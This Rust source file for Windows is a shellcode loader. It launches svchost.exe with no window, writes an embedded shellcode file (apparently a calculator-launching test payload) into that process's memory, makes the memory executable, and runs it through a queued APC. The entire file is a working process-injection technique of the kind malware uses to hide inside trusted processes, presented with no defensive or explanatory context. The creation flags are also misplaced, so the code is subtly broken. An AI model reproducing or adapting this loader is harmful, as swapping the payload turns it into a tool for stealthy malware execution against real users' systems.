#![windows_subsystem = "windows"]

use std::mem::{transmute, zeroed};
use std::ptr::{null, null_mut};
use windows_sys::Win32::Foundation::{CloseHandle, FALSE, TRUE};
use windows_sys::Win32::System::Diagnostics::Debug::WriteProcessMemory;
use windows_sys::Win32::System::Memory::{
    VirtualAllocEx, VirtualProtectEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE, PAGE_READWRITE,
};
use windows_sys::Win32::System::Threading::{
    CreateProcessA, QueueUserAPC, ResumeThread, CREATE_NO_WINDOW, CREATE_SUSPENDED,
    PROCESS_INFORMATION, STARTF_USESTDHANDLES, STARTUPINFOA,
};

const SHELLCODE: &[u8] = include_bytes!("../../w64-exec-calc-shellcode-func.bin");
const SIZE: usize = SHELLCODE.len();

#[cfg(target_os = "windows")]
fn main() {
    let mut old = PAGE_READWRITE;
    let program = b"C:\\Windows\\System32\\svchost.exe\0";

    unsafe {
        let mut pi: PROCESS_INFORMATION = zeroed();
        let mut si: STARTUPINFOA = zeroed();
        si.dwFlags = STARTF_USESTDHANDLES | CREATE_SUSPENDED;
        si.wShowWindow = 0;

        let res = CreateProcessA(
            program.as_ptr(),
            null_mut(),
            null(),
            null(),
            TRUE,
            CREATE_NO_WINDOW,
            null(),
            null(),
            &si,
            &mut pi,
        );
        if res == FALSE {
            panic!("CreateProcessA failed!");
        }

        let dest = VirtualAllocEx(
            pi.hProcess,
            null(),
            SIZE,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );
        if dest.is_null() {
            panic!("VirtualAllocEx failed!");
        }

        let res = WriteProcessMemory(
            pi.hProcess,
            dest,
            SHELLCODE.as_ptr().cast(),
            SIZE,
            null_mut(),
        );
        if res == FALSE {
            panic!("WriteProcessMemory failed!");
        }

        let res = VirtualProtectEx(pi.hProcess, dest, SIZE, PAGE_EXECUTE, &mut old);
        if res == FALSE {
            panic!("VirtualProtectEx failed!");
        }

        let dest = transmute(dest);
        let res = QueueUserAPC(Some(dest), pi.hThread, 0);
        if res == 0 {
            panic!("QueueUserAPC failed!");
        }
        ResumeThread(pi.hThread);

        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}
